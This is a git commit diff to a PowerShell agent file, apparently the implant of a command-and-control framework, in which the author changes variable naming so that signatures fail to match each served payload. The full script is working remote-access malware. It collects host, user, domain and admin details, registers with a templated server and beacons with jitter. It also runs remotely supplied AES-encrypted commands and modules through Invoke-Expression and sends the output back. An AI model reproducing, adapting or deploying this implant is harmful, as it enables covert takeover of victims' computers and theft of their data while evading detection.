9fac9936d1250ad48f34c9b5abf71a688f34ca54
ahmed khlief <ahmed.khlief@gmail.com>
2021-04-15 00:03:36 +0300

    Randomized Variables everytime the payload requested

--- agents/payload2.ps1
+++ agents/payload2.ps1
@@ -1,48 +1,48 @@
-$beacon=1
-function CAM ($key,$IV){
+$exchange={beacon}
+function CAM ($key,${IV}){
 
-$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
-$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
-$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-$a.BlockSize = 128
-$a.KeySize = 256
-if ($IV)
+${a} = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
+${a}.Mode = [System.Security.Cryptography.CipherMode]::CBC
+${a}.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+${a}.BlockSize = 128
+${a}.KeySize = 256
+if (${IV})
 {
-if ($IV.getType().Name -eq "String")
-{$a.IV = [System.Convert]::FromBase64String($IV)}
+if (${IV}.getType().Name -eq "String")
+{${a}.IV = [System.Convert]::FromBase64String(${IV})}
 else
-{$a.IV = $IV}
+{${a}.IV = ${IV}}
 }
 if ($key)
 {
 if ($key.getType().Name -eq "String")
-{$a.Key = [System.Convert]::FromBase64String($key)}
+{${a}.Key = [System.Convert]::FromBase64String($key)}
 else
-{$a.Key = $key}
+{${a}.Key = $key}
 }
-$a}
+${a}}
 
 
-function ENC ($key,$un,$file=0){
-if ($file -eq 0){
-$b = [System.Text.Encoding]::UTF8.GetBytes($un)}
+function ENC ($key,${un},${file}=0){
+if (${file} -eq 0){
+${b} = [System.Text.Encoding]::UTF8.GetBytes(${un})}
 else{
-$b=$un}
-$a = CAM $key
-$e = $a.CreateEncryptor()
-$f = $e.TransformFinalBlock($b, 0, $b.Length)
-[byte[]] $p = $a.IV + $f
-[System.Convert]::ToBase64String($p)
+${b}=${un}}
+${a} = CAM $key
+${e} = ${a}.CreateEncryptor()
+${f} = ${e}.TransformFinalBlock(${b}, 0, ${b}.Length)
+[byte[]] ${p} = ${a}.IV + ${f}
+[System.Convert]::ToBase64String(${p})
 }
 
 
-function DEC ($key,$enc,$file=0){
-$b = [System.Convert]::FromBase64String($enc)
-$IV = $b[0..15]
-$a = CAM $key $IV
-$d = $a.CreateDecryptor()
-$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
-if ($file -eq 0){
+function DEC ($key,${enc},${file}=0){
+${b} = [System.Convert]::FromBase64String(${enc})
+${IV} = ${b}[0..15]
+${a} = CAM $key ${IV}
+$d = ${a}.CreateDecryptor()
+$u = $d.TransformFinalBlock(${b}, 16, ${b}.Length - 16)
+if (${file} -eq 0){
 [System.Text.Encoding]::UTF8.GetString($u)
 }
 else{
@@ -51,133 +51,135 @@ return $u}
 
 
 
-function load($module)
+function load(${module})
       {
 
-            $modulename = enc -key $key -un $module
+            ${modulename} = enc -key $key -{un} ${module}
 
-            $wc3 = new-object net.WebClient
-            $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-            $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+            ${wc3} = new-object net.WebClient
+            ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+            ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
 
             try{
-              $postParams = @{data=$modulename}
-                $re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
-		$re=$re.Content
+              ${postParams} = @{data=${modulename}}
+                ${req}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{md}?page=${agent} -Method POST -Body ${postParams}
+		${req}=${req}.Content
             }
             catch{
-                $postParams = "data=$modulename"
-                $wc3 = new-object net.WebClient
-                $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-                $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
-                $re=$wc3.UploadString("{HTTP}://{ip}:{port}{md}?page=$agent","POST",$postParams)
+                ${postParams} = "data=${modulename}&resource=${agent}&b=0"
+                ${wc3} = new-object net.WebClient
+                ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+                ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+                ${req}=${wc3}.UploadString("{HTTP}://{ip}:{port}{md}",${postParams})
                 }
 
 
-            $modulecontent=dec -key $key -enc $re
+            $modulecontent=dec -key $key -{enc} ${req}
 
 
       return $modulecontent
       }
 
-$hostname = $env:COMPUTERNAME;
-if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $t="*"}
-$whoami = $env:USERNAME;
-$whoami ="$t$whoami"
-$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
-$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
-$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
-$IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
-$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
-$agent="$random-img.jpeg"
-$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid&$random=$agent"
-$wc3 = new-object net.WebClient
-      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
-      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}",$finaldata)
-$progressPreference = 'silentlyContinue';
+${hostname} = $env:COMPUTERNAME;
+if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ ${t}="*"}
+${whoami} = $env:USERNAME;
+${whoami} ="${t}${whoami}"
+${arch} = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+${os} = (Get-WmiObject -class Win32_OperatingSystem).Caption + "(${arch})";
+${domain} = (Get-WmiObject Win32_ComputerSystem).Domain;
+${IP}=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
+${random} = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
+${agent}="${random}-img.jpeg"
 
-$wc3 = New-Object system.Net.WebClient;
+${finaldata}="data=${os}**${IP}**${arch}**${hostname}**${domain}**${whoami}**$pid&${random}=${agent}"
+${wc3} = new-object net.WebClient
+      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      $key=${wc3}.UploadString("{HTTP}://{ip}:{port}{register}",${finaldata})
+${progressPreference} = 'silentlyContinue';
+
+${wc3} = New-Object system.Net.WebClient;
+
+$windows=${agent}
 while($true){
-$seed=[int](Get-Date -UFormat "%s")%97
-#secho $seed
-$rand=Get-Random -Minimum 50 -Maximum 250 -SetSeed $seed
-$data=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count $rand | % {[char]$_});
+${seed}=[int](Get-Date -UFormat "%s")%97
+${rand}=Get-Random -Minimum 50 -Maximum 250 -SetSeed ${seed}
+${data}=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count ${rand} | % {[char]$_});
 
 
 try{
-    $postParams = @{resource=$agent;authentication=$data}
-$enc=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{cmd} -Method POST -Body $postParams
-$enc=$enc.Content
+    ${postParams} = @{resource=${agent};authentication=${data}}
+${enc}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{cmd} -Method POST -Body ${postParams}
+${enc}=${enc}.Content
 }
  catch{
-$postParams="resource=$agent&authentication=$data"
-        $wc3 = new-object net.WebClient
-      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
-      $enc=$wc3.UploadString("{HTTP}://{ip}:{port}{cmd}","POST",$postParams)
+${postParams}="resource=${agent}&authentication=${data}"
+        ${wc3} = new-object net.WebClient
+      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      ${enc}=${wc3}.UploadString("{HTTP}://{ip}:{port}{cmd}",${postParams})
         }
 
 
 
-if($enc -eq "REGISTER"){
-$wc3 = new-object net.WebClient
-      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
-      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}",$finaldata)
-$progressPreference = 'silentlyContinue';
+if(${enc} -eq "REGISTER"){
+${wc3} = new-object net.WebClient
+      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      $key=${wc3}.UploadString("{HTTP}://{ip}:{port}{register}",${finaldata})
+${progressPreference} = 'silentlyContinue';
 continue
 }
-$reg=echo $enc | select-string -Pattern "\-\*\-\*\-\*"
+$reg=echo ${enc} | select-string -Pattern "\-\*\-\*\-\*"
 if($reg)
-#$enc -eq "-")
+#${enc} -eq "-")
 {
-$seed=[int](Get-Date -UFormat "%s")
-$min=[int]$beacon/2+1
-$max=[int]$beacon+1
-$beacon=Get-Random -Minimum $min -Maximum $max -SetSeed $seed
-sleep $beacon
-$date = (Get-Date -Format "dd/MM/yyyy")
-$date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
-$kdate = [datetime]::ParseExact("{DATE}","dd/MM/yyyy",$null)
-if ($kdate -lt $date) {kill $pid}
+${seed}=[int](Get-Date -UFormat "%s")
+${min}=[int]$exchange/2+1
+${max}=[int]$exchange+1
+$exchange=Get-Random -Minimum ${min} -Maximum ${max} -SetSeed ${seed}
+sleep $exchange
+${date} = (Get-Date -Format "dd/MM/yyyy")
+${date} = [datetime]::ParseExact(${date},"dd/MM/yyyy",$null)
+${kdate} = [datetime]::ParseExact("{DATE}","dd/MM/yyyy",$null)
+if (${kdate} -lt ${date}) {kill $pid}
 }
 else{
-$cm=dec -key $key -enc $enc
+${cm}=dec -key $key -{enc} ${enc}
 
 
 
-if($cm.split(" ")[0] -eq "load"){
-$f=$cm.split(" ")[1]
-$module=load -module $f
+if(${cm}.split(" ")[0] -eq "load"){
+${f}=${cm}.split(" ")[1]
+${module}=load -{module} ${f}
 try{
-$output=Invoke-Expression ($module) -ErrorVariable badoutput | Out-String
+${output}=Invoke-Expression (${module}) -ErrorVariable {badoutput} | Out-String
         }
         catch{
-        $output = $Error[0] | Out-String;
+        ${output} = $Error[0] | Out-String;
         }
-        if ($output.Length -eq 0){
-        $output="$output$badoutput"
+        if (${output}.Length -eq 0){
+        ${output}="${output}${badoutput}"
         }
 
 
 }
 else{
 try{
-$output=Invoke-Expression ($cm) -ErrorVariable badoutput | Out-String
+${output}=Invoke-Expression (${cm}) -ErrorVariable {badoutput} | Out-String
         }
         catch{
-        $output = $Error[0] | Out-String;
+        ${output} = $Error[0] | Out-String;
         }
-        if ($output.Length -eq 0){
-        $output="$output$badoutput"
+        if (${output}.Length -eq 0){
+        ${output}="${output}${badoutput}"
         }}
 
-  if ($output.Length -eq 0){
-$output="$output$badoutput"
+  if (${output}.Length -eq 0){
+${output}="${output}${badoutput}"
 }
 
-$redata=enc -key $key -un $output
+${redata}=enc -key $key -{un} ${output}
 
 
 
@@ -185,18 +187,18 @@ $redata=enc -key $key -un $output
 
 
  try{
-      $postParams = @{resource=$agent;data=$redata}
-$re=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re} -Method POST -Body $postParams
+      ${postParams} = @{resource=${agent};data=${redata}}
+${result}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{re} -Method POST -Body ${postParams}
 }
  catch{
- $postParams = "resource=$agent&data=$redata"
-        $wc3 = new-object net.WebClient
-      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
-      $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
-      $re=$wc3.UploadString("{HTTP}://{ip}:{port}{re}","POST",$postParams)
+ ${postParams} = "resource=${agent}&data=${redata}"
+        ${wc3} = new-object net.WebClient
+      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+      ${result}=${wc3}.UploadString("{HTTP}://{ip}:{port}{re}","POST",${postParams})
         }
 
-$re=" "
-
+${result}=" "
+${output}=" "
 }
 }
